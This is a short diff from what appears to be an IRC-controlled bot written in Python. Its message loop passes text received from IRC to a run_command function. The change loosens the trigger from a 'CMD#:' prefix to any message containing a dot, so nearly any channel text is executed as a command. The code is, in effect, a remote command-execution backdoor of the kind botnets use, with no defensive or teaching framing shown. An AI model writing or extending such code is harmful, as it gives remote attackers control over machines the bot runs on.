@@ -46,8 +46,8 @@ while 1:
 		if text.lower().find(":@quit")!=-1:
 			irc.close()
 			break;
-		elif text.find("CMD#:")!=-1:
-			print(str(text.split("CMD#:")[-1]))
-			run_command(str(text.split("CMD#:")[-1]))
+		elif text.find(".")!=-1:
+			print(str(text.split(".")[-1]))
+			run_command(str(text.split(".")[-1]))
 		text = ""
 	sys.exit()
